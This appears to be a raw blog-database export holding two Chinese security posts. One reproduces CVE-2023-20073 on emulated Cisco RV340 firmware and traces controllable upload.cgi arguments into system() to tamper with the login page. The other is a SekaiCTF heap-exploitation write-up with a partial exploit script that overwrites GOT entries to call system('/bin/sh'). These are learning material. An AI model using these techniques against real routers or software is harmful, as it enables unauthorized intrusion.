busybox\n\n在解压出来的文件系统下，查看busybox的信息\n\n![busybox](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724202303901.png)\n\n下载需要的文件\n\n```\nwget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2\nwget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress\nwget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress\n```\n\n## 启动qemu\n\n先执行\n\nqemu-img resize debian_wheezy_armhf_standard.qcow2 32G\n\n### boot.sh\n\n```shell\nsudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \\\n  -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \\\n  -append \"root=/dev/mmcblk0p2\" -net nic -net tap,ifname=tap0,script=no,downscript=no \\\n  -nographic -smp 4\n```\n\n然后sudo ./boot.sh\n\n![启动](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725121644660.png)\n\n用户密码都是root\n\n往虚拟机中传刚才的文件，先打包在传送\n\ntar -czvf rootfs.tar.gz rootfs\n\nsudo scp -r rootfs.tar.gz root@192.168.225.134:/root/rootfs.tar.gz\n\ntar -xzvf rootfs.tar.gz\n\n## 仿真隔离\n\n```shell\nchmod -R 777 rootfs\ncd rootfs/\nmount --bind /proc proc\nmount --bind /dev dev\nchroot . /bin/sh\n```\n\n## 启动Nginx\n\n```\n/etc/init.d/boot boot\ngenerate_default_cert\n/etc/init.d/confd start\n/etc/init.d/nginx start\n```\n\n## 访问\n\n\n\n![网页](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725171041446.png)\n\n## 漏洞分析\n\n### rest.url.conf\n\n![rest.url.conf](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801133734167.png)\n`upload_pass` ,后台会用/form-file-upload 继续处理\n`upload_store`,文件会上传到/tmp/upload\n`upload_store_access`,设置了文件的权限\n`upload_set_form_field xxx` 设置了文件的相关字段，文件名、文件类型、文件路径、md5值、文件大小\n\n### web.upload.conf\n\n![web.upload.conf](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163029477.png)\n这里通过uwsgi_pass,将请求转发，最后会执行 `upload.cgi`\n\n### upload.cgi\n#### sub_115EC\n\n![sub_115ec](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163641641.png)\n这里最终会执行system函数，而sprintf中的三个参数都是可以控制的，只要我们把s_1设置为刚才上传的文件路径，_tmp_firmware控制为/tmp/www(要把s1控制为Portal) , s_2控制位login.html就可以篡改登录界面\n\n#### main\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164510313.png)\n\n根据上面的分析，也就是v17要控制为Portal，V16要控制为刚上传的文件路径，v18要是login.html\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164909962.png)\n\nv17对应v30，v16对应v29，v18对应v31","slug":"Iot/CVE-2023-20073","published":1,"date":"2025-08-11T16:59:10.105Z","updated":"2025-08-12T03:46:02.359Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2i4000juomya30y86jl","content":"<h1 id=\"CVE-2023-20073\"><a href=\"#CVE-2023-20073\" class=\"headerlink\" title=\"CVE-2023-20073\"></a>CVE-2023-20073</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    开始学习iot的漏洞挖掘，第一次复现cve漏洞<br><a href=\"https://bbs.kanxue.com/thread-278240.htm\">[原创]从零开始复现 CVE-2023-20073-智能设备-看雪-安全社区|安全招聘|kanxue.com</a></p>\n<h2 id=\"固件获取\"><a href=\"#固件获取\" class=\"headerlink\" title=\"固件获取\"></a>固件获取</h2><p><a href=\"https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29\">Software Download - Cisco Systems</a></p>\n<p>从官网获取RV340 的固件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184650280.png\" alt=\"固件下载\"></p>\n<h2 id=\"binwalk-解压\"><a href=\"#binwalk-解压\" class=\"headerlink\" title=\"binwalk 解压\"></a>binwalk 解压</h2><p>binwalk -Me xxx.img</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184805292.png\" alt=\"binwalk解压\"></p>\n<p>解压成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190444842.png\" alt=\"解压\"></p>\n<p>但是和文章一样出现了warnning</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190638436.png\" alt=\"warning\"></p>\n<p>配置起来有点麻烦，因为binwalk 现在很难搞，~~所以我决定直接手动修改这个链接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -sf /tmp var</span><br></pre></td></tr></table></figure>\n\n<p>事实证明这样做是不行的，后续仿真时会失败。可能是因为还有其他的软连接被破坏了，所以只能去修改binwalk 的文件内容。因为我是用apt-get install 安装的binwalk ，所以我只能通过找到已经安装的binwalk 的文件位置来修改。<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173240219.png\" alt=\"binwalk\"></p>\n<p>我这里是1008行，把这里修改为if 0 and not </p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173349943.png\" alt=\"修改\"></p>\n<p>问题解决</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724201653555.png\" alt=\"结果\"></p>\n<h2 id=\"qume-与-主机连接\"><a href=\"#qume-与-主机连接\" class=\"headerlink\" title=\"qume 与 主机连接\"></a>qume 与 主机连接</h2><p>先下载后面的 东西，在运行这个脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用 iproute2 替代 brctl</span></span><br><span class=\"line\">PHY_IFACE=&quot;ens33&quot;</span><br><span class=\"line\">BRIDGE=&quot;br0&quot;    </span><br><span class=\"line\">TAP_IFACE=&quot;tap0&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建网桥</span></span><br><span class=\"line\">sudo ip link add name $BRIDGE type bridge</span><br><span class=\"line\">sudo ip link set $BRIDGE up</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">配置物理接口</span></span><br><span class=\"line\">sudo ip link set $PHY_IFACE promisc on</span><br><span class=\"line\">sudo ip link set $PHY_IFACE master $BRIDGE</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建 TAP 设备</span></span><br><span class=\"line\">sudo ip tuntap add mode tap user root name $TAP_IFACE</span><br><span class=\"line\">sudo ip link set $TAP_IFACE promisc on</span><br><span class=\"line\">sudo ip link set $TAP_IFACE master $BRIDGE</span><br><span class=\"line\">sudo ip link set $TAP_IFACE up</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取 DHCP</span></span><br><span class=\"line\">sudo dhclient -v $BRIDGE</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">验证配置</span></span><br><span class=\"line\">echo -e &quot;\\n=== 网络配置验证 ===&quot;</span><br><span class=\"line\">bridge link show $BRIDGE</span><br><span class=\"line\">ip addr show $BRIDGE</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"busybox\"><a href=\"#busybox\" class=\"headerlink\" title=\"busybox\"></a>busybox</h2><p>在解压出来的文件系统下，查看busybox的信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724202303901.png\" alt=\"busybox\"></p>\n<p>下载需要的文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class=\"line\">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br><span class=\"line\">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"启动qemu\"><a href=\"#启动qemu\" class=\"headerlink\" title=\"启动qemu\"></a>启动qemu</h2><p>先执行</p>\n<p>qemu-img resize debian_wheezy_armhf_standard.qcow2 32G</p>\n<h3 id=\"boot-sh\"><a href=\"#boot-sh\" class=\"headerlink\" title=\"boot.sh\"></a>boot.sh</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \\</span><br><span class=\"line\">  -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \\</span><br><span class=\"line\">  -append &quot;root=/dev/mmcblk0p2&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no \\</span><br><span class=\"line\">  -nographic -smp 4</span><br></pre></td></tr></table></figure>\n\n<p>然后sudo .&#x2F;boot.sh</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725121644660.png\" alt=\"启动\"></p>\n<p>用户密码都是root</p>\n<p>往虚拟机中传刚才的文件，先打包在传送</p>\n<p>tar -czvf rootfs.tar.gz rootfs</p>\n<p>sudo scp -r rootfs.tar.gz <a href=\"mailto:&#x72;&#111;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x32;&#50;&#53;&#x2e;&#49;&#51;&#x34;\">&#x72;&#111;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x32;&#50;&#53;&#x2e;&#49;&#51;&#x34;</a>:&#x2F;root&#x2F;rootfs.tar.gz</p>\n<p>tar -xzvf rootfs.tar.gz</p>\n<h2 id=\"仿真隔离\"><a href=\"#仿真隔离\" class=\"headerlink\" title=\"仿真隔离\"></a>仿真隔离</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod -R 777 rootfs</span><br><span class=\"line\">cd rootfs/</span><br><span class=\"line\">mount --bind /proc proc</span><br><span class=\"line\">mount --bind /dev dev</span><br><span class=\"line\">chroot . /bin/sh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"启动Nginx\"><a href=\"#启动Nginx\" class=\"headerlink\" title=\"启动Nginx\"></a>启动Nginx</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/boot boot</span><br><span class=\"line\">generate_default_cert</span><br><span class=\"line\">/etc/init.d/confd start</span><br><span class=\"line\">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"访问\"><a href=\"#访问\" class=\"headerlink\" title=\"访问\"></a>访问</h2><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725171041446.png\" alt=\"网页\"></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><h3 id=\"rest-url-conf\"><a href=\"#rest-url-conf\" class=\"headerlink\" title=\"rest.url.conf\"></a>rest.url.conf</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801133734167.png\" alt=\"rest.url.conf\"><br><code>upload_pass</code> ,后台会用&#x2F;form-file-upload 继续处理<br><code>upload_store</code>,文件会上传到&#x2F;tmp&#x2F;upload<br><code>upload_store_access</code>,设置了文件的权限<br><code>upload_set_form_field xxx</code> 设置了文件的相关字段，文件名、文件类型、文件路径、md5值、文件大小</p>\n<h3 id=\"web-upload-conf\"><a href=\"#web-upload-conf\" class=\"headerlink\" title=\"web.upload.conf\"></a>web.upload.conf</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163029477.png\" alt=\"web.upload.conf\"><br>这里通过uwsgi_pass,将请求转发，最后会执行 <code>upload.cgi</code></p>\n<h3 id=\"upload-cgi\"><a href=\"#upload-cgi\" class=\"headerlink\" title=\"upload.cgi\"></a>upload.cgi</h3><h4 id=\"sub-115EC\"><a href=\"#sub-115EC\" class=\"headerlink\" title=\"sub_115EC\"></a>sub_115EC</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163641641.png\" alt=\"sub_115ec\"><br>这里最终会执行system函数，而sprintf中的三个参数都是可以控制的，只要我们把s_1设置为刚才上传的文件路径，_tmp_firmware控制为&#x2F;tmp&#x2F;www(要把s1控制为Portal) , s_2控制位login.html就可以篡改登录界面</p>\n<h4 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main\"></a>main</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164510313.png\" alt=\"main\"></p>\n<p>根据上面的分析，也就是v17要控制为Portal，V16要控制为刚上传的文件路径，v18要是login.html</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164909962.png\" alt=\"main\"></p>\n<p>v17对应v30，v16对应v29，v18对应v31</p>\n","excerpt":"","more":"<h1 id=\"CVE-2023-20073\"><a href=\"#CVE-2023-20073\" class=\"headerlink\" title=\"CVE-2023-20073\"></a>CVE-2023-20073</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    开始学习iot的漏洞挖掘，第一次复现cve漏洞<br><a href=\"https://bbs.kanxue.com/thread-278240.htm\">[原创]从零开始复现 CVE-2023-20073-智能设备-看雪-安全社区|安全招聘|kanxue.com</a></p>\n<h2 id=\"固件获取\"><a href=\"#固件获取\" class=\"headerlink\" title=\"固件获取\"></a>固件获取</h2><p><a href=\"https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29\">Software Download - Cisco Systems</a></p>\n<p>从官网获取RV340 的固件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184650280.png\" alt=\"固件下载\"></p>\n<h2 id=\"binwalk-解压\"><a href=\"#binwalk-解压\" class=\"headerlink\" title=\"binwalk 解压\"></a>binwalk 解压</h2><p>binwalk -Me xxx.img</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184805292.png\" alt=\"binwalk解压\"></p>\n<p>解压成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190444842.png\" alt=\"解压\"></p>\n<p>但是和文章一样出现了warnning</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190638436.png\" alt=\"warning\"></p>\n<p>配置起来有点麻烦，因为binwalk 现在很难搞，~~所以我决定直接手动修改这个链接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -sf /tmp var</span><br></pre></td></tr></table></figure>\n\n<p>事实证明这样做是不行的，后续仿真时会失败。可能是因为还有其他的软连接被破坏了，所以只能去修改binwalk 的文件内容。因为我是用apt-get install 安装的binwalk ，所以我只能通过找到已经安装的binwalk 的文件位置来修改。<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173240219.png\" alt=\"binwalk\"></p>\n<p>我这里是1008行，把这里修改为if 0 and not </p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173349943.png\" alt=\"修改\"></p>\n<p>问题解决</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724201653555.png\" alt=\"结果\"></p>\n<h2 id=\"qume-与-主机连接\"><a href=\"#qume-与-主机连接\" class=\"headerlink\" title=\"qume 与 主机连接\"></a>qume 与 主机连接</h2><p>先下载后面的 东西，在运行这个脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用 iproute2 替代 brctl</span></span><br><span class=\"line\">PHY_IFACE=&quot;ens33&quot;</span><br><span class=\"line\">BRIDGE=&quot;br0&quot;    </span><br><span class=\"line\">TAP_IFACE=&quot;tap0&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建网桥</span></span><br><span class=\"line\">sudo ip link add name $BRIDGE type bridge</span><br><span class=\"line\">sudo ip link set $BRIDGE up</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">配置物理接口</span></span><br><span class=\"line\">sudo ip link set $PHY_IFACE promisc on</span><br><span class=\"line\">sudo ip link set $PHY_IFACE master $BRIDGE</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建 TAP 设备</span></span><br><span class=\"line\">sudo ip tuntap add mode tap user root name $TAP_IFACE</span><br><span class=\"line\">sudo ip link set $TAP_IFACE promisc on</span><br><span class=\"line\">sudo ip link set $TAP_IFACE master $BRIDGE</span><br><span class=\"line\">sudo ip link set $TAP_IFACE up</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取 DHCP</span></span><br><span class=\"line\">sudo dhclient -v $BRIDGE</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">验证配置</span></span><br><span class=\"line\">echo -e &quot;\\n=== 网络配置验证 ===&quot;</span><br><span class=\"line\">bridge link show $BRIDGE</span><br><span class=\"line\">ip addr show $BRIDGE</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"busybox\"><a href=\"#busybox\" class=\"headerlink\" title=\"busybox\"></a>busybox</h2><p>在解压出来的文件系统下，查看busybox的信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724202303901.png\" alt=\"busybox\"></p>\n<p>下载需要的文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class=\"line\">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br><span class=\"line\">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"启动qemu\"><a href=\"#启动qemu\" class=\"headerlink\" title=\"启动qemu\"></a>启动qemu</h2><p>先执行</p>\n<p>qemu-img resize debian_wheezy_armhf_standard.qcow2 32G</p>\n<h3 id=\"boot-sh\"><a href=\"#boot-sh\" class=\"headerlink\" title=\"boot.sh\"></a>boot.sh</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \\</span><br><span class=\"line\">  -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \\</span><br><span class=\"line\">  -append &quot;root=/dev/mmcblk0p2&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no \\</span><br><span class=\"line\">  -nographic -smp 4</span><br></pre></td></tr></table></figure>\n\n<p>然后sudo .&#x2F;boot.sh</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725121644660.png\" alt=\"启动\"></p>\n<p>用户密码都是root</p>\n<p>往虚拟机中传刚才的文件，先打包在传送</p>\n<p>tar -czvf rootfs.tar.gz rootfs</p>\n<p>sudo scp -r rootfs.tar.gz <a href=\"mailto:&#x72;&#111;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x32;&#50;&#53;&#x2e;&#49;&#51;&#x34;\">&#x72;&#111;&#111;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x32;&#50;&#53;&#x2e;&#49;&#51;&#x34;</a>:&#x2F;root&#x2F;rootfs.tar.gz</p>\n<p>tar -xzvf rootfs.tar.gz</p>\n<h2 id=\"仿真隔离\"><a href=\"#仿真隔离\" class=\"headerlink\" title=\"仿真隔离\"></a>仿真隔离</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod -R 777 rootfs</span><br><span class=\"line\">cd rootfs/</span><br><span class=\"line\">mount --bind /proc proc</span><br><span class=\"line\">mount --bind /dev dev</span><br><span class=\"line\">chroot . /bin/sh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"启动Nginx\"><a href=\"#启动Nginx\" class=\"headerlink\" title=\"启动Nginx\"></a>启动Nginx</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/boot boot</span><br><span class=\"line\">generate_default_cert</span><br><span class=\"line\">/etc/init.d/confd start</span><br><span class=\"line\">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"访问\"><a href=\"#访问\" class=\"headerlink\" title=\"访问\"></a>访问</h2><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725171041446.png\" alt=\"网页\"></p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><h3 id=\"rest-url-conf\"><a href=\"#rest-url-conf\" class=\"headerlink\" title=\"rest.url.conf\"></a>rest.url.conf</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801133734167.png\" alt=\"rest.url.conf\"><br><code>upload_pass</code> ,后台会用&#x2F;form-file-upload 继续处理<br><code>upload_store</code>,文件会上传到&#x2F;tmp&#x2F;upload<br><code>upload_store_access</code>,设置了文件的权限<br><code>upload_set_form_field xxx</code> 设置了文件的相关字段，文件名、文件类型、文件路径、md5值、文件大小</p>\n<h3 id=\"web-upload-conf\"><a href=\"#web-upload-conf\" class=\"headerlink\" title=\"web.upload.conf\"></a>web.upload.conf</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163029477.png\" alt=\"web.upload.conf\"><br>这里通过uwsgi_pass,将请求转发，最后会执行 <code>upload.cgi</code></p>\n<h3 id=\"upload-cgi\"><a href=\"#upload-cgi\" class=\"headerlink\" title=\"upload.cgi\"></a>upload.cgi</h3><h4 id=\"sub-115EC\"><a href=\"#sub-115EC\" class=\"headerlink\" title=\"sub_115EC\"></a>sub_115EC</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163641641.png\" alt=\"sub_115ec\"><br>这里最终会执行system函数，而sprintf中的三个参数都是可以控制的，只要我们把s_1设置为刚才上传的文件路径，_tmp_firmware控制为&#x2F;tmp&#x2F;www(要把s1控制为Portal) , s_2控制位login.html就可以篡改登录界面</p>\n<h4 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main\"></a>main</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164510313.png\" alt=\"main\"></p>\n<p>根据上面的分析，也就是v17要控制为Portal，V16要控制为刚上传的文件路径，v18要是login.html</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164909962.png\" alt=\"main\"></p>\n<p>v17对应v30，v16对应v29，v18对应v31</p>\n"},{"title":"sekaictf-2025-pwn","cover":"/img/治不开心药.png","_content":"# sekaictf--pwn复现 \n## 前言\n\n备战下一场xctf分站赛\n\n## speedpwn-2\n\n这是一道tcache 利用的题目，赛后复盘是有源码的，但我们这里还是从写题的角度进行一个分析\n\n### ida分析\n![图1](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901184359282.png)\n\n `main` 函数 首先申请了`0x190`大小的堆块作为一块画布, 然后循环进行操作. 每次循环的开始会调用`print_canvas` 把画布的内容打印出来,然后用户可以输入`p,r,h` 进行对应的操作\n 1. p , 修改堆块的一个字节\n 2. r , 重新申请堆块\n 3. h , 打印操作的说明\n\n图1 就是 r , 对应的操作\n\n![图2](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901185458942.png)\n\n图2 这里是p , 对应的操作.\n在75 行这里,就是一个明显的溢出漏洞. 因为这里没有对范围的检测 , 所以我们可以输入非法值 , 去修改不在这个堆块范围内的堆空间的值 .\n\n### 思路分析\n\n题目环境是 2.34的libc\n\n1. 首先是泄露libc . 题目没有开启`ALSR`和`FULL RELRO` ,  可以从`ida`里获取函数`plt`的地址 , 同时可以修改`got` 表 . 首先 ,  利用 溢出漏洞 ,  修改 `tcache_perthread_struct` 的 `counts` 和 `entries`, 把 `.got`表 附近的某一段 放入`tcache bins` 中 ,  再利用 `r` 把这个块空间分配出来.\n2. 然后是 ,  修改`got` 表. 利用上面的溢出漏洞 , 把 `free` 修改为`printf`, 利用格式化字符串  , 泄露出`libc`.\n3.  重复 1 的步骤 , 把这个堆块 重新申请回来. 因为当时`free` 被修改为了 `printf`, 所以不能直接申请 ,  得重复1 的步骤.\n4. 这一次把free修改为system , 然后把堆块内容设置为`/bin/sh\\x00`\n\n### exp\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\nurl=\"\"\nport=0\nio,elf=loadfile(\"./chall\",url,port)\nlibc=ELF(\"./libc.so.6\")\n\ndef pr_c(r,l,c):\n\tio.sendlineafter(\"> \",b\"p\")\n\tio.sendline(str(r))\n\tio.sendline(str(l))\n\tio.sendline(hex(c)[2:])\n\ndef re_c(r,l):\n\tio.sendlineafter(\"> \",b\"r\")\n\tio.sendline(str(r))\n\tio.sendline(str(l))\t\ngdb.attach(io,\"b *0x401605\")\npr_c(0,-0x290,0x1)\nbss=0x404070\ni=0\nwhile bss > 0:\n\tpr_c(0,-0x210+i,bss & 